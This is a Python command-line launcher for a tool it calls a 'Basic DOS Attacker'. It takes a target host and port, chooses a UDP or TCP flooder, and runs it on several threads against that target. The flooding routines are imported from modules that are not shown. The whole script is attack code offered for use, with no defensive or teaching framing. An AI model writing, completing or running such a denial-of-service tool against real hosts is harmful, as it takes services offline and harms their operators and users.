import time
import argparse
from utils.flooder import flooder_selector
from utils.thread_manager import thread_manager


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Basic DOS Attacker')
    parser.add_argument("-a", dest="address", required=True, help="Hostname or IP address")
    parser.add_argument("-p", dest="port", default=80, type=int, help="Port, default 80")
    parser.add_argument("-c", dest="choice", default="UDP", help="UDP or TCP, default UPD")
    parser.add_argument("-m", dest="packets", default=10, type=int, help="Num of packets in a socket, default 10")
    parser.add_argument("-t", dest="threads", default=2, type=int, help="Num of threads, default 2")
    args = parser.parse_args()

    ip = args.address
    port = args.port
    choice = args.choice
    packets = args.packets
    threads = args.threads

    flooder = flooder_selector(choice)
    thread_manager(threads, flooder, ip, port, packets)

    while True:
        time.sleep(2)
